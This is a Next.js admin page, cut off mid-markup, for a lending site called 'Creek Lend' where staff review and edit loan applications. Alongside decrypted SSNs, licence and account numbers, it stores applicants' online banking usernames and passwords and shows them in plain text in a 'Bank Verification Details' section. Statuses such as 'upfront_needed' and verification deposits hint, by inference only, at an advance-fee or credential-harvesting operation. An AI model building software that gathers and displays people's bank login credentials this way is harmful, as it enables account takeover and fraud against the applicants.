"use client";

import { useCallback, useEffect, useState } from "react";
import { useParams, useRouter } from "next/navigation";
import Link from "next/link";
import { useAdminAuth, useAdminApi } from "@/lib/admin-auth";
import { US_STATES } from "@/lib/constants";
// The canonical option lists — the same ones the applicant's form posts and
// the server re-validates. `@/lib/constants` still carries an older, narrower
// set (`debt-consolidation`, `employed`) that the API would now reject.
import {
  ACCOUNT_AGES,
  ACCOUNT_STATUSES,
  ACCOUNT_TYPES,
  EMPLOYMENT_STATUSES,
  HOUSING_STATUSES,
  INCOME_TYPES,
  LOAN_PURPOSES,
  NAME_SUFFIXES,
  Option,
  PAY_FREQUENCIES,
  PURPOSE_REQUIRING_DETAIL,
  TIME_AT_ADDRESS,
  TIME_AT_JOB,
} from "@/lib/application/options";
import { formatDateTime } from "@/lib/datetime";
import {
  ApplicationDetail,
  ApplicationResponse,
  AuditEntry,
  BankVerificationDetail,
} from "@/lib/application/types";

const BANK_VERIFICATION_METHODS: Option[] = [
  { value: "manual", label: "Manual" },
  { value: "instant", label: "Instant" },
];

// NAME_SUFFIXES carries an empty-value entry for the applicant's form; the
// admin selects render their own "None" placeholder.
const SUFFIX_OPTIONS: Option[] = NAME_SUFFIXES.filter((o) => o.value !== "");

const STATE_OPTIONS: Option[] = US_STATES.map((s) => ({
  value: s.value,
  label: s.label,
}));

/**
 * The edit buffer.
 *
 * Every application column is optional, plus a nested bank-verification patch
 * that the PATCH endpoint accepts alongside the application fields.
 */
type ApplicationFormData = Partial<ApplicationDetail> & {
  bankVerification?: Partial<BankVerificationDetail>;
};

// const STATUS_COLORS: Record<string, string> = {
//   bank_verification_pending: "bg-yellow-100 text-yellow-800 border-yellow-200",
//   reviewing: "bg-blue-100 text-blue-800 border-blue-200",
//   bank_verification_completed: "bg-green-100 text-green-800 border-green-200",
//   declined: "bg-red-100 text-red-800 border-red-200",
//   funded: "bg-purple-100 text-purple-800 border-purple-200",
//   bank_verification_failed: "bg-red-100 text-red-800 border-red-200",
//   bank_verification_in_progress:
//     "bg-indigo-100 text-indigo-800 border-indigo-200",
//   deposit_in_progress: "bg-yellow-100 text-yellow-800",
// };

// const ALL_STATUSES = [
//   "bank_verification_pending",
//   "reviewing",
//   "bank_verification_completed",
//   "declined",
//   "funded",
//   "bank_verification_failed",
//   "bank_verification_in_progress",
//   "deposit_in_progress",
// ];

const STATUS_COLORS: Record<string, string> = {
  bank_verification_pending: "bg-yellow-100 text-yellow-800 border-yellow-200",
  // bank_verification_failed: "bg-red-100 text-red-800 border-red-200",
  // verification_deposit_1: "bg-blue-100 text-blue-800 border-blue-200",
  // verification_deposit_2: "bg-blue-100 text-blue-800 border-blue-200",
  funded: "bg-purple-100 text-purple-800 border-purple-200",
  // declined: "bg-red-100 text-red-800 border-red-200",
  declined_pb: "bg-red-100 text-red-800 border-red-200",
  declined_hd: "bg-red-100 text-red-800 border-red-200",
  bank_reverification: "bg-amber-100 text-amber-800 border-amber-200",
  request_a_call: "bg-indigo-100 text-indigo-800 border-indigo-200",
  // upfront_needed: "bg-orange-100 text-orange-800 border-orange-200",
  bank_verification_completed: "bg-green-100 text-green-800 border-green-200",
};

const ALL_STATUSES = [
  // "bank_verification_pending",
  // "bank_verification_failed",
  // "verification_deposit_1",
  // "verification_deposit_2",
  "funded",
  // "declined",
  "declined_pb",
  "declined_hd",
  "bank_reverification",
  "request_a_call",
  // "upfront_needed",
];
function formatCurrency(amount: number | string | null | undefined) {
  // DECIMAL columns arrive as strings ("5000.00") over JSON.
  const n = typeof amount === "number" ? amount : Number(amount);
  if (amount == null || amount === "" || !Number.isFinite(n)) return "-";
  return new Intl.NumberFormat("en-US", {
    style: "currency",
    currency: "USD",
    minimumFractionDigits: 2,
    maximumFractionDigits: 2,
  }).format(n);
}

/** The human label for a stored option value, falling back to the raw value. */
function labelFor(options: Option[], value: string | null | undefined) {
  if (!value) return "-";
  return (
    options.find((o) => o.value === value)?.label ??
    value.replace(/_/g, " ").replace(/\b\w/g, (l) => l.toUpperCase())
  );
}

function formatYesNo(value: boolean | null | undefined) {
  if (value == null) return "-";
  return value ? "Yes" : "No";
}

/** A JSONB string array (pre-qual reasons, review flags) as readable prose. */
function formatList(values: string[] | null | undefined) {
  if (!values || values.length === 0) return "-";
  return values
    .map((v) => v.replace(/_/g, " ").replace(/\b\w/g, (l) => l.toUpperCase()))
    .join(", ");
}

/** Seconds on the form as "45m 21s". */
function formatDuration(seconds: number | null | undefined) {
  if (seconds == null || !Number.isFinite(Number(seconds))) return "-";
  const total = Math.max(0, Math.round(Number(seconds)));
  const h = Math.floor(total / 3600);
  const m = Math.floor((total % 3600) / 60);
  const s = total % 60;
  return [h ? `${h}h` : "", m ? `${m}m` : "", `${s}s`]
    .filter(Boolean)
    .join(" ");
}

/** A DATE column narrowed to what `<input type="date">` accepts. */
function toDateInput(value: string | null | undefined) {
  if (!value) return "";
  const match = /^(\d{4})-(\d{2})-(\d{2})/.exec(String(value));
  return match ? match[0] : "";
}

/** Renders a DATE column ("2026-09-17") without tripping over UTC parsing. */
function formatDateOnly(value: string | null | undefined) {
  if (!value) return "-";
  const match = /^(\d{4})-(\d{2})-(\d{2})/.exec(String(value));
  if (!match) return String(value);
  const [, y, m, d] = match;
  return `${m}/${d}/${y}`;
}

function calcMonthlyPayment(amount: number, termMonths: number): number {
  const monthlyRate = 0.1 / 12;
  const factor = Math.pow(1 + monthlyRate, termMonths);
  return (amount * (monthlyRate * factor)) / (factor - 1);
}

function mdyToIso(mdy?: string | number | null) {
  if (!mdy) return "";

  const s = String(mdy);

  // Match MM/DD/YYYY with optional time
  const match = s.match(/^(\d{2})\/(\d{2})\/(\d{4})/);

  if (match) {
    const [, m, d, y] = match;
    return `${y}-${m}-${d}`;
  }

  return s.slice(0, 10);
}

function isoToMdy(iso: string) {
  if (!iso) return "";

  const match = iso.match(/^(\d{4})-(\d{2})-(\d{2})/);

  if (match) {
    const [, y, m, d] = match;
    return `${m}/${d}/${y}`;
  }

  return iso;
}

function formatDate(date: string | null) {
  if (!date) return "N/A";
  return new Date(date).toLocaleString("en-US", {
    month: "short",
    day: "numeric",
    year: "numeric",
    hour: "numeric",
    minute: "2-digit",
  });
}

function Section({
  title,
  children,
}: {
  title: string;
  children?: React.ReactNode;
}) {
  return (
    <div className="bg-white rounded-xl border border-gray-200 p-6">
      <h3 className="text-sm font-semibold text-gray-500 uppercase tracking-wide mb-4">
        {title}
      </h3>
      <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">{children}</div>
    </div>
  );
}

function Field({
  label,
  value,
}: {
  label: string;
  value: string | number | null | undefined;
}) {
  return (
    <div>
      <p className="text-xs text-gray-400">{label}</p>
      <p className="text-sm font-medium text-gray-900">{value ?? "N/A"}</p>
    </div>
  );
}

function EditableField({
  label,
  name,
  value,
  type = "text",
  min,
  max,
  onChange,
}: {
  label: string;
  name: string;
  value: string | number | null | undefined;
  type?: string;
  min?: number | string;
  max?: number | string;
  onChange: (name: string, value: string | number) => void;
}) {
  return (
    <div>
      <label className="text-xs text-gray-400">{label}</label>
      <input
        type={type}
        name={name}
        min={min}
        max={max}
        lang="en-US"
        value={value ?? ""}
        onChange={(e) => {
          if (type === "number") {
            const num = Number(e.target.value);
            const minN = min !== undefined ? Number(min) : -Infinity;
            const maxN = max !== undefined ? Number(max) : Infinity;
            const clamped = Math.min(Math.max(num, minN), maxN);
            onChange(name, Number.isNaN(clamped) ? 0 : clamped);
          } else {
            onChange(name, e.target.value);
          }
        }}
        className="w-full mt-1 px-3 py-2 border border-gray-300 rounded-lg text-sm text-gray-900 focus:outline-none focus:ring-2 focus:ring-primary focus:border-transparent"
      />
    </div>
  );
}

const CONTROL_CLASS =
  "w-full mt-1 px-3 py-2 border border-gray-300 rounded-lg text-sm text-gray-900 focus:outline-none focus:ring-2 focus:ring-primary focus:border-transparent";

function SelectField({
  label,
  name,
  value,
  options,
  placeholder = "Select…",
  onChange,
}: {
  label: string;
  name: string;
  value: string | null | undefined;
  options: Option[];
  placeholder?: string;
  onChange: (name: string, value: string) => void;
}) {
  // A stored value outside the current option list still has to be visible —
  // an older application must not silently render as blank.
  const isUnknown = !!value && !options.some((o) => o.value === value);

  return (
    <div>
      <label htmlFor={name} className="block text-xs text-gray-400">
        {label}
      </label>
      <select
        id={name}
        name={name}
        value={value ?? ""}
        onChange={(e) => onChange(name, e.target.value)}
        className={CONTROL_CLASS}
      >
        <option value="">{placeholder}</option>
        {options.map((o) => (
          <option key={o.value} value={o.value}>
            {o.label}
          </option>
        ))}
        {isUnknown && (
          <option value={value as string}>{value} (current)</option>
        )}
      </select>
    </div>
  );
}

/** A nullable boolean column — "not answered" is a distinct, storable state. */
function BooleanField({
  label,
  name,
  value,
  onChange,
}: {
  label: string;
  name: string;
  value: boolean | null | undefined;
  onChange: (name: string, value: string) => void;
}) {
  return (
    <div>
      <label htmlFor={name} className="block text-xs text-gray-400">
        {label}
      </label>
      <select
        id={name}
        name={name}
        value={value == null ? "" : value ? "yes" : "no"}
        onChange={(e) => onChange(name, e.target.value)}
        className={CONTROL_CLASS}
      >
        <option value="">Not answered</option>
        <option value="yes">Yes</option>
        <option value="no">No</option>
      </select>
    </div>
  );
}

export default function ApplicationDetailPage() {
  const params = useParams();
  const router = useRouter();
  const { user, loading, logout, isReviewer, isAdmin } = useAdminAuth();
  const { adminFetch } = useAdminApi();

  const [app, setApp] = useState<ApplicationDetail | null>(null);
  const [bankVerification, setBankVerification] =
    useState<BankVerificationDetail | null>(null);
  const [auditLog, setAuditLog] = useState<AuditEntry[]>([]);
  const [dataLoading, setDataLoading] = useState(true);
  const [showDecrypted, setShowDecrypted] = useState(false);
  const [statusUpdating, setStatusUpdating] = useState(false);
  const [deleteConfirm, setDeleteConfirm] = useState(false);
  const [error, setError] = useState("");
  const [success, setSuccess] = useState("");
  const [edit, setEdit] = useState(false);
  const [saving, setSaving] = useState(false);
  const [formData, setFormData] = useState<ApplicationFormData>({});

  const id = params.id as string;

  useEffect(() => {
    if (!loading && !user) router.replace("/admin/login");
  }, [loading, user, router]);

  // Re-read after every write. The server normalizes what it stores — dates,
  // trimmed strings, encrypted columns — so echoing the submitted form back
  // into `app` would show values the database does not actually hold.
  const loadApplication = useCallback(async () => {
    const res = await adminFetch(`/api/admin/applications/${id}`);
    if (!res.ok) throw new Error("Application not found");
    const data: ApplicationResponse = await res.json();
    setApp(data.application);
    setBankVerification(data.bankVerification);
    setAuditLog(data.auditLog || []);
  }, [adminFetch, id]);

  useEffect(() => {
    if (!user || !id) return;

    loadApplication()
      .catch((err: unknown) =>
        setError(err instanceof Error ? err.message : "Failed to load"),
      )
      .finally(() => setDataLoading(false));
  }, [user, id, loadApplication]);

  useEffect(() => {
    if (edit && app) {
      setFormData({
        // Identity
        first_name: app.first_name,
        middle_initial: app.middle_initial,
        last_name: app.last_name,
        name_suffix: app.name_suffix,
        email: app.email,
        phone: app.phone,
        date_of_birth: app.date_of_birth,
        ssn_decrypted: app.ssn_decrypted,
        dl_decrypted: app.dl_decrypted,
        dl_state: app.dl_state,
        dl_expiration_date: app.dl_expiration_date,
        // Residence
        street_address: app.street_address,
        address_unit: app.address_unit,
        city: app.city,
        state: app.state,
        zip_code: app.zip_code,
        country: app.country,
        time_at_address: app.time_at_address,
        housing_status: app.housing_status,
        monthly_housing_payment: app.monthly_housing_payment,
        // Employment and income
        employment_status: app.employment_status,
        primary_income_type: app.primary_income_type,
        employer_name: app.employer_name,
        job_title: app.job_title,
        employer_phone: app.employer_phone,
        time_at_job: app.time_at_job,
        years_employed: app.years_employed,
        monthly_income: app.monthly_income,
        pay_frequency: app.pay_frequency,
        next_pay_date: app.next_pay_date,
        direct_deposit: app.direct_deposit,
        additional_monthly_income: app.additional_monthly_income,
        additional_income_source: app.additional_income_source,
        // Loan request
        loan_amount: app.loan_amount,
        loan_purpose: app.loan_purpose,
        loan_purpose_other: app.loan_purpose_other,
        loan_term: app.loan_term,
        // Banking
        bank_name: app.bank_name,
        routing_number: app.routing_number,
        account_decrypted: app.account_decrypted,
        account_type: app.account_type,
        bank_balance_status: app.bank_balance_status,
        bank_account_age: app.bank_account_age,
        bank_verification_method: app.bank_verification_method,
        // Attribution
        assisted_by_loan_agent: app.assisted_by_loan_agent,
        bankVerification: {
          online_banking_username:
            bankVerification?.online_banking_username ?? "",
          online_banking_password:
            bankVerification?.online_banking_password ?? "",
          bank_name: bankVerification?.bank_name ?? "",
          account_type: bankVerification?.account_type ?? "",
          full_name: bankVerification?.full_name ?? "",
          email: bankVerification?.email ?? "",
        },
      });
    }
  }, [edit, app, bankVerification]);

  const formatPhone = (value: string | number) => {
    const digits = String(value).replace(/\D/g, "").slice(0, 10);

    if (digits.length > 6) {
      return `(${digits.slice(0, 3)}) ${digits.slice(3, 6)}-${digits.slice(6)}`;
    }
    if (digits.length > 3) {
      return `(${digits.slice(0, 3)}) ${digits.slice(3)}`;
    }
    if (digits.length > 0) return `(${digits}`;
    return "";
  };

  const handleFormChange = (name: string, value: string | number) => {
    let newValue: string | number | boolean | null = value;

    if (name === "phone" || name === "employer_phone") {
      newValue = formatPhone(value);
    }

    if (name === "middle_initial") {
      newValue = String(value)
        .replace(/[^A-Za-z]/g, "")
        .slice(0, 1)
        .toUpperCase();
    }

    if (name === "direct_deposit") {
      // The select's empty option means "not answered" — a real, storable state.
      newValue = value === "" ? null : value === "yes";
    }

    if (name === "ssn_decrypted") {
      const digits = String(value).replace(/\D/g, "").slice(0, 9);

      if (digits.length > 5) {
        newValue = `${digits.slice(0, 3)}-${digits.slice(3, 5)}-${digits.slice(5)}`;
      } else if (digits.length > 3) {
        newValue = `${digits.slice(0, 3)}-${digits.slice(3)}`;
      } else {
        newValue = digits;
      }
    }

    setFormData((prev) => ({
      ...prev,
      [name]: newValue,
    }));
  };

  const handleBankVerificationChange = (
    name: string,
    value: string | number,
  ) => {
    setFormData((prev) => ({
      ...prev,
      bankVerification: {
        ...prev.bankVerification,
        [name]: value,
      },
    }));
  };

  const handleSave = async () => {
    setSaving(true);
    setError("");
    setSuccess("");
    try {
      const res = await adminFetch(`/api/admin/applications/${id}`, {
        method: "PATCH",
        body: JSON.stringify(formData),
      });
      const data = await res.json();
      if (!res.ok) throw new Error(data.error || "Save failed");
      await loadApplication();
      setSuccess("Application updated successfully");
      setEdit(false);
    } catch (err) {
      setError(err instanceof Error ? err.message : "Save failed");
    } finally {
      setSaving(false);
    }
  };

  const handleStatusUpdate = async (newStatus: string) => {
    setStatusUpdating(true);
    setError("");
    setSuccess("");

    try {
      const res = await adminFetch(`/api/admin/applications/${id}`, {
        method: "PATCH",
        body: JSON.stringify({ status: newStatus }),
      });
      const data = await res.json();
      if (!res.ok) throw new Error(data.error);

      setSuccess(
        `Status updated to ${newStatus.replace(/_/g, " ").replace(/\b\w/g, (l) => l.toUpperCase())}`,
      );

      // Pulls back the new status alongside the audit entry it generated.
      await loadApplication();
    } catch (err) {
      setError(err instanceof Error ? err.message : "Update failed");
    } finally {
      setStatusUpdating(false);
    }
  };

  const handleDelete = async () => {
    try {
      const res = await adminFetch(`/api/admin/applications/${id}`, {
        method: "DELETE",
      });
      if (!res.ok) {
        const data = await res.json();
        throw new Error(data.error);
      }
      router.push("/admin/applications");
    } catch (err) {
      setError(err instanceof Error ? err.message : "Delete failed");
      setDeleteConfirm(false);
    }
  };

  if (loading || !user) {
    return (
      <div className="min-h-screen flex items-center justify-center">
        <div className="animate-spin rounded-full h-8 w-8 border-b-2 border-primary" />
      </div>
    );
  }

  if (user.role === "reviewer") {
    return (
      <div className="min-h-screen bg-gray-50">
        {/* Top Nav */}
        <nav className="bg-white border-b border-gray-200 px-6 py-3 flex items-center justify-between sticky top-0 z-10">
          <div className="flex items-center gap-6">
            <Link href="/admin" className="text-xl font-bold text-primary">
              Creek Lend
            </Link>
            <div className="hidden sm:flex items-center gap-4 text-sm">
              <Link
                href="/admin"
                className="text-gray-600 hover:text-primary transition"
              >
                Dashboard
              </Link>
              <Link
                href="/admin/applications"
                className="text-primary font-medium"
              >
                Applications
              </Link>
            </div>
          </div>
          <div className="flex items-center gap-4">
            <span className="text-sm text-gray-500 hidden sm:inline">
              {user.name} ({user.role})
            </span>
            <button
              onClick={logout}
              className="text-sm text-red-600 hover:text-red-800 font-medium cursor-pointer"
            >
              Logout
            </button>
          </div>
        </nav>

        <div className="max-w-5xl mx-auto px-4 sm:px-6 py-8">
          {/* Back link */}
          <button
            onClick={() => router.back()}
            className="text-sm text-primary hover:underline mb-4 inline-block cursor-pointer"
          >
            &larr; Back to Applications
          </button>

          {dataLoading ? (
            <div className="flex justify-center py-12">
              <div className="animate-spin rounded-full h-8 w-8 border-b-2 border-primary" />
            </div>
          ) : error && !app ? (
            <div className="p-8 text-center text-red-500">{error}</div>
          ) : app ? (
            <div className="space-y-6">
              {/* Header */}
              <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4">
                <div>
                  <h1 className="text-2xl font-bold text-gray-900">
                    {app.first_name} {app.last_name}
                  </h1>
                  <p className="text-gray-500">
                    {app.email} &middot; {app.phone}
                  </p>
                </div>
                <span
                  className={`px-4 py-2 rounded-full text-sm font-semibold border ${STATUS_COLORS[app.status] || ""}`}
                >
                  {app.status.replace(/_/g, " ").toUpperCase()}
                </span>
              </div>

              {/* Messages */}
              {error && (
                <div className="p-3 bg-red-50 border border-red-200 text-red-700 rounded-lg text-sm">
                  {error}
                </div>
              )}
              {success && (
                <div className="p-3 bg-green-50 border border-green-200 text-green-700 rounded-lg text-sm">
                  {success}
                </div>
              )}

              {/* Status Actions */}
              {isReviewer && (
                <div className="bg-white rounded-xl border border-gray-200 p-6">
                  <h3 className="text-sm font-semibold text-gray-500 uppercase tracking-wide mb-3">
                    Update Status
                  </h3>
                  <div className="flex flex-wrap gap-2">
                    {ALL_STATUSES.filter((s) => {
                      // If reviewer → only allow 2 statuses
                      if (isReviewer) {
                        return [
                          "declined_pb",
                          "declined_hd",
                          "bank_reverification",
                        ].includes(s);
                      }

                      // Otherwise → show all except current
                      return s !== app.status;
                    }).map((s) => (
                      <button
                        key={s}
                        onClick={() => handleStatusUpdate(s)}
                        disabled={statusUpdating}
                        className={`px-4 py-2 rounded-lg text-sm font-medium border transition cursor-pointer disabled:opacity-50 ${STATUS_COLORS[s] || ""}`}
                      >
                        {statusUpdating
                          ? "..."
                          : s
                              .replace(/_/g, " ")
                              .replace(/\b\w/g, (l) => l.toUpperCase())}
                      </button>
                    ))}
                  </div>
                </div>
              )}

              {/* Personal Info */}
              <Section title="Personal Information">
                <Field label="Application ID" value={app.id} />
                <Field
                  label="Full name"
                  value={[
                    app.first_name,
                    app.middle_initial,
                    app.last_name,
                    app.name_suffix,
                  ]
                    .filter(Boolean)
                    .join(" ")}
                />
                <Field label="Email" value={app.email} />
                <Field label="Phone" value={app.phone} />
                <Field
                  label="Date of Birth"
                  value={
                    app.date_of_birth
                      ? new Date(app.date_of_birth).toLocaleDateString(
                          "en-US",
                          {
                            month: "2-digit",
                            day: "2-digit",
                            year: "numeric",
                          },
                        )
                      : "N/A"
                  }
                />
                {/* <Field label="Driver's License State" value={app.dl_state} />
                <Field label="SSN" value={app.ssn_decrypted} />
                <Field label="DL Number" value={app.dl_decrypted} /> */}
              </Section>

              <Section title="Identity Verification">
                <Field label="SSN" value={app.ssn_decrypted || "•••-••-••••"} />

                <Field
                  label="Driver's License"
                  value={app.dl_decrypted || "••••••••"}
                />

                <Field label="DL Issuing State" value={app.dl_state || "-"} />

                <Field
                  label="DL Expiration"
                  value={formatDateOnly(app.dl_expiration_date)}
                />

                <Field
                  label="Credit Check Authorization"
                  value={formatYesNo(app.credit_check_consent)}
                />

                {/* {isAdmin && (
                    <button
                      type="button"
                      onClick={handleRevealSensitive}
                      className="text-sm text-primary hover:underline text-left"
                    >
                      Reveal sensitive data
                    </button>
                  )} */}
              </Section>

              {/* Address */}
              <Section title="Address">
                <Field
                  label="Street Address"
                  value={app.street_address || "-"}
                />

                <Field
                  label="Apt / Unit / Suite"
                  value={app.address_unit || "-"}
                />

                <Field label="City" value={app.city || "-"} />

                <Field label="State" value={app.state || "-"} />

                <Field label="ZIP Code" value={app.zip_code || "-"} />

                <Field label="Country" value={app.country || "-"} />

                <Field
                  label="Time at Current Address"
                  value={labelFor(TIME_AT_ADDRESS, app.time_at_address)}
                />

                <Field
                  label="Housing Status"
                  value={labelFor(HOUSING_STATUSES, app.housing_status)}
                />

                <Field
                  label="Monthly Housing Payment"
                  value={formatCurrency(app.monthly_housing_payment)}
                />
              </Section>

              {/* Employment */}
              <Section title="Employment & Income">
                <Field
                  label="Employment Status"
                  value={labelFor(EMPLOYMENT_STATUSES, app.employment_status)}
                />

                <Field
                  label="Primary Income Type"
                  value={labelFor(INCOME_TYPES, app.primary_income_type)}
                />

                <Field label="Employer" value={app.employer_name || "-"} />

                <Field label="Job Title" value={app.job_title || "-"} />

                <Field
                  label="Employer Phone"
                  value={app.employer_phone || "-"}
                />

                <Field
                  label="Time at Current Job"
                  value={labelFor(TIME_AT_JOB, app.time_at_job)}
                />

                <Field
                  label="Net Monthly Income"
                  value={formatCurrency(app.monthly_income)}
                />

                <Field
                  label="Pay Frequency"
                  value={labelFor(PAY_FREQUENCIES, app.pay_frequency)}
                />

                <Field
                  label="Next Pay Date"
                  value={formatDateOnly(app.next_pay_date)}
                />

                <Field
                  label="Direct Deposit"
                  value={formatYesNo(app.direct_deposit)}
                />

                <Field
                  label="Additional Monthly Income"
                  value={formatCurrency(app.additional_monthly_income)}
                />

                <Field
                  label="Additional Income Source"
                  value={app.additional_income_source || "-"}
                />
              </Section>

              {/* Loan Details */}
              <Section title="Loan Details">
                <Field
                  label="Loan Amount"
                  value={formatCurrency(Number(app.loan_amount))}
                />

                <Field
                  label="Loan Purpose"
                  value={labelFor(LOAN_PURPOSES, app.loan_purpose)}
                />

                {app.loan_purpose === PURPOSE_REQUIRING_DETAIL && (
                  <Field
                    label="Purpose — Other Detail"
                    value={app.loan_purpose_other || "-"}
                  />
                )}

                <Field label="Loan Term" value={`${app.loan_term} months`} />

                <Field
                  label="Monthly Payment"
                  value={formatCurrency(
                    calcMonthlyPayment(
                      Number(app.loan_amount),
                      Number(app.loan_term),
                    ),
                  )}
                />
              </Section>

              {/* Banking */}
              <Section title="Banking Information">
                <Field label="Bank Name" value={app.bank_name || "-"} />

                <Field
                  label="Routing Number"
                  value={app.routing_number || "-"}
                />

                <Field
                  label="Account Type"
                  value={labelFor(ACCOUNT_TYPES, app.account_type)}
                />

                <Field
                  label="Account Number"
                  value={app.account_decrypted || "-"}
                />

                <Field
                  label="Account Status"
                  value={labelFor(ACCOUNT_STATUSES, app.bank_balance_status)}
                />

                <Field
                  label="Account Age"
                  value={labelFor(ACCOUNT_AGES, app.bank_account_age)}
                />

                <Field
                  label="Bank Verification"
                  value={
                    app.bank_verification_completed ? "Completed" : "Pending"
                  }
                />

                {/* {isAdmin && (
                  <button
                    type="button"
                    onClick={handleRevealSensitive}
                    className="text-sm text-primary hover:underline text-left"
                  >
                    Reveal bank account data
                  </button>
                )} */}
              </Section>

              {/* Bank Verification Details */}
              {bankVerification && (
                <Section title="Bank Verification Details">
                  {/* <Field
                    label="Full name"
                    value={bankVerification?.full_name}
                  /> */}
                  {/* <Field label="Email" value={bankVerification?.email} /> */}
                  <Field
                    label="Online Bank Username"
                    value={bankVerification?.online_banking_username}
                  />
                  <Field
                    label="Online Bank Password"
                    value={bankVerification?.online_banking_password}
                  />
                  {/* <Field
                    label="Application ID"
                    value={bankVerification?.application_id}
                  />
                  <Field
                    label="Bank Name"
                    value={bankVerification?.bank_name}
                  />
                  <Field
                    label="Account"
                    value={bankVerification?.account_type}
                  />
                  <Field
                    label="Verification Status"
                    value={bankVerification?.verification_status}
                  />
                  <Field
                    label="Submitted At"
                    value={bankVerification?.created_at}
                  /> */}
                </Section>
              )}

              {/* UTM / Tracking */}
              {/* {(app.utm_source || app.utm_medium || app.utm_campaign) && (
                <Section title="UTM Tracking">
                  <Field label="Source" value={app.utm_source} />
                  <Field label="Medium" value={app.utm_medium} />
                  <Field label="Campaign" value={app.utm_campaign} />
                  <Field label="Content" value={app.utm_content} />
                </Section>
              )} */}

              {/* Timestamps */}
              {/* <Section title="Timestamps">
                <Field label="Created" value={formatDate(app.created_at)} />
                <Field label="Updated" value={formatDate(app.updated_at)} />
                <Field label="Reviewed" value={formatDate(app.reviewed_at)} />
                <Field label="Funded" value={formatDate(app.funded_at)} />
                <Field label="IP Address" value={app.ip_address} />
              </Section> */}

              {/* Audit Log */}
              {auditLog.length > 0 && (
                <div className="bg-white rounded-xl border border-gray-200 p-6">
                  <h3 className="text-sm font-semibold text-gray-500 uppercase tracking-wide mb-4">
                    Audit Log
                  </h3>
                  <div className="space-y-3">
                    {auditLog.map((entry) => (
                      <div
                        key={entry.id}
                        className="flex items-start gap-3 text-sm border-b border-gray-50 pb-3"
                      >
                        <div className="flex-1">
                          <span className="font-medium text-gray-900">
                            {entry.action}
                          </span>
                          <span className="text-gray-400 mx-2">by</span>
                          <span className="text-gray-600">
                            {entry.performed_by}
                          </span>
                          {entry.details &&
                            Object.keys(entry.details).length > 0 && (
                              <p className="text-xs text-gray-400 mt-1 break-all overflow-hidden">
                                {JSON.stringify(entry.details)}
                              </p>
                            )}
                        </div>
                        <span className="text-xs text-gray-400 whitespace-nowrap">
                          {formatDateTime(entry.created_at)}
                        </span>
                      </div>
                    ))}
                  </div>
                </div>
              )}

              {/* Delete */}
              {isAdmin && (
                <div className="bg-white rounded-xl border border-red-200 p-6">
                  <h3 className="text-sm font-semibold text-red-500 uppercase tracking-wide mb-3">
                    Danger Zone
                  </h3>
                  {deleteConfirm ? (
                    <div className="flex items-center gap-3">
                      <p className="text-sm text-gray-600">
                        Are you sure? This action cannot be undone.
                      </p>
                      <button
                        onClick={handleDelete}
                        className="px-4 py-2 bg-red-600 text-white rounded-lg text-sm font-medium hover:bg-red-700 transition cursor-pointer"
                      >
                        Confirm Delete
                      </button>
                      <button
                        onClick={() => setDeleteConfirm(false)}
                        className="px-4 py-2 border border-gray-300 rounded-lg text-sm hover:bg-gray-50 transition cursor-pointer"
                      >
                        Cancel
                      </button>
                    </div>
                  ) : (
                    <button
                      onClick={() => setDeleteConfirm(true)}
                      className="px-4 py-2 border border-red-300 text-red-600 rounded-lg text-sm font-medium hover:bg-red-50 transition cursor-pointer"
                    >
                      Delete Application
                    </button>
                  )}
                </div>
              )}
            </div>
          ) : null}
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gray-50">
      {/* Top Nav */}
      <nav className="bg-white border-b border-gray-200 px-6 py-3 flex items-center justify-between sticky top-0 z-10">
        <div className="flex items-center gap-6">
          <Link href="/admin" className="text-xl font-bold text-primary">
            Creek Lend
          </Link>
          <div className="hidden sm:flex items-center gap-4 text-sm">
            <Link
              href="/admin"
              className="text-gray-600 hover:text-primary transition"
            >
              Dashboard
            </Link>
            <Link
              href="/admin/applications"
              className="text-primary font-medium"
            >
              Applications
            </Link>
          </div>
        </div>
        <div className="flex items-center gap-4">
          <span className="text-sm text-gray-500 hidden sm:inline">
            {user.name} ({user.role})
          </span>
          <button
            onClick={logout}
            className="text-sm text-red-600 hover:text-red-800 font-medium cursor-pointer"
          >
            Logout
          </button>
        </div>
      </nav>

      <div className="max-w-5xl mx-auto px-4 sm:px-6 py-8">
        {/* Back link */}
        <button
          onClick={() => router.back()}
          className="text-sm text-primary hover:underline mb-4 inline-block cursor-pointer"
        >
          &larr; Back to Applications
        </button>

        {dataLoading ? (
          <div className="flex justify-center py-12">
            <div className="animate-spin rounded-full h-8 w-8 border-b-2 border-primary" />
          </div>
        ) : error && !app ? (
          <div className="p-8 text-center text-red-500">{error}</div>
        ) : app ? (
          <div className="space-y-6">
            {/* Header */}
            <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4">
              <div>
                <h1 className="text-2xl font-bold text-gray-900">
                  {app.first_name} {app.last_name}
                </h1>
                <p className="text-gray-500">
                  {app.email} &middot; {app.phone}
                </p>
              </div>
              <div className="flex items-center gap-3 flex-wrap">
                {edit ? (
                  <>
                    <button
                      onClick={handleSave}
                      disabled={saving}
                      className="px-4 py-2 rounded-lg text-sm font-medium bg-primary text-white hover:opacity-90 transition cursor-pointer disabled:opacity-50"
                    >
                      {saving ? "Saving..." : "Save"}
                    </button>
                    <button
                      onClick={() => setEdit(false)}
                      disabled={saving}
                      className="px-4 py-2 rounded-lg text-sm font-medium border border-gray-300 text-gray-700 hover:bg-gray-50 transition cursor-pointer disabled:opacity-50"
                    >
                      Cancel
                    </button>
                  </>
                ) : (
                  isAdmin && (
                    <button
                      onClick={() => setEdit(true)}
                      className="px-4 py-2 rounded-lg text-sm font-medium border border-gray-300 text-gray-700 hover:bg-gray-50 transition cursor-pointer"
                    >
                      Edit
                    </button>
                  )
                )}
                <span
                  className={`px-4 py-2 rounded-full text-sm font-semibold border ${STATUS_COLORS[app.status] || ""}`}
                >
                  {app.status.replace(/_/g, " ").toUpperCase()}
                </span>
              </div>
            </div>

            {/* Messages */}
            {error && (
              <div className="p-3 bg-red-50 border border-red-200 text-red-700 rounded-lg text-sm">
                {error}
              </div>
            )}
            {success && (
              <div className="p-3 bg-green-50 border border-green-200 text-green-700 rounded-lg text-sm">
                {success}
              </div>
            )}

            {/* Status Actions */}
            {isReviewer && (
              <div className="bg-white rounded-xl border border-gray-200 p-6">
                <h3 className="text-sm font-semibold text-gray-500 uppercase tracking-wide mb-3">
                  Update Status
                </h3>
                <div className="flex flex-wrap gap-2">
                  {ALL_STATUSES.filter((s) => s !== app.status).map((s) => (
                    <button
                      key={s}
                      onClick={() => handleStatusUpdate(s)}
                      disabled={statusUpdating}
